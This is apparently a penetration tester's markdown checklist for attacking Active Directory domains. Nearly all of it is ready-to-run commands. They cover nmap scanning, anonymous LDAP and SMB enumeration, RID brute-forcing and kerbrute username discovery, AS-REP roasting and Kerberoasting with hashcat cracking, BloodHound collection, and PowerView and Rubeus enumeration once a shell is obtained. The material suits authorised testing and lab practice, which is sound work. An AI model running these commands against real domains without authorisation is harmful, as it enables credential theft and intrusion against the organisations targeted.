---
title: AD Checklist
type: checklist
tab: Checklists
target: ActiveDirectory
tags: [ActiveDirectory, Checklist, Enumeration]
---

# AD Checklist

## Goal

Move from first contact to a usable AD path: identify the DC, collect users, test safe roast paths, then move into post-credential enumeration.

## Flow

- [ ] Scan ports and identify AD services.
- [ ] Sync time before Kerberos work.
- [ ] Try anonymous LDAP/SMB/RPC enum.
- [ ] Build a username list.
- [ ] Try AS-REP roast and Kerberoast paths.
- [ ] Collect BloodHound data once creds are available.
- [ ] Run post-creds enum from Windows if you have a shell.
- [ ] Save usernames, groups, shares, policy, and found files for later suggestions.

## Nmap

```sh
# Fast full TCP scan.
nmap -p- --min-rate 1000 -T4 <TARGET_IP> -oN nmap_ports.txt

# Extract ports and run a detailed scan.
ports=$(grep open nmap_ports.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
nmap -sC -sV -p$ports <TARGET_IP> -oN nmap_detail.txt

# Quick UDP checks.
sudo nmap -sU --top-ports 10 <TARGET_IP>
sudo nmap -sU --top-ports 50 <TARGET_IP>
```

## Sync Clock

Use this when Kerberos returns `Clock skew too great`.

```sh
sudo ntpdate <DC_IP>
sudo timedatectl set-ntp false
sudo hwclock --systohc
```

## Anonymous Enum

```sh
# LDAP user descriptions and usernames.
nxc ldap <DC_IP> -u '' -p '' --query '(objectclass=user)' '' | awk '/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }'
nxc ldap <DC_IP> -u '' -p '' --query '(objectclass=user)' '' | grep sAMAccountName | awk '{print $6}'

# Anonymous/guest SMB shares.
nxc smb <DC_IP> -u anonymous -p '' --shares
nxc smb <DC_IP> -u guest -p '' --shares
```

## Username Enum

```sh
# RID brute and save discovered names.
nxc smb <DC_IP> -u anonymous -p '' --rid-brute 5000 > rid.txt
nxc smb <DC_IP> -u guest -p '' --rid-brute 5000 >> rid.txt

# Extract user, dedupe, append only new users.
grep "SidTypeUser" rid.txt | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -v '\$$' | tr '[:upper:]' '[:lower:]' | sort -u | grep -vxFf users.txt >> users.txt

# Kerberos username enum.  
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o kerbrute.txt

# Extract valid users, dedupe, append only new users.  
grep -a "VALID USERNAME:" kerbrute.txt | awk -F'[@ ]+' '{print tolower($(NF-1))}' | sort -u | grep -vxFf users.txt >> users.txt
```

## AS-REP Roast / Kerberoast

```sh
# AS-REP roast from a user list.
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'

# Crack an AS-REP hash after saving it to a file.
echo '<ASREP_HASH>' > asrep.hash
hashcat -m 18200 asrep.hash <WORDLIST>

# Kerberoast with valid creds.
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile tgs.hashes
hashcat -m 13100 tgs.hashes <WORDLIST>
```

## BloodHound

```sh
# dump bloodhound
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_HOST> -ns <DC_IP> -c All --zip
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_HOST> -ns <DC_IP> -c All --dns-tcp --zip
# Start bloodhound
bloodhound-legacy/BloodHound --no-sandbox --disable-gpu
```

## Post-Creds Enum

```powershell
whoami /all
net user <USER> /domain
net group "Domain Admins" /domain
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# BloodHound collection from Windows.
.\SharpHound.exe -c All --zipfilename bh-output.zip

# PowerView.
Get-NetDomain
Get-NetDomainController
Get-NetUser | Select-Object samaccountname,description,pwdlastset
Get-NetGroup "Domain Admins" | Select-Object member
Find-LocalAdminAccess

# Kerberoasting from Windows.
.\Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt <WORDLIST>
```

## Done When

- You have `users.txt`, domain name, DC IP/hostname, and password policy context.
- You know whether anonymous access, AS-REP roast, Kerberoast, or BloodHound gives a useful next path.
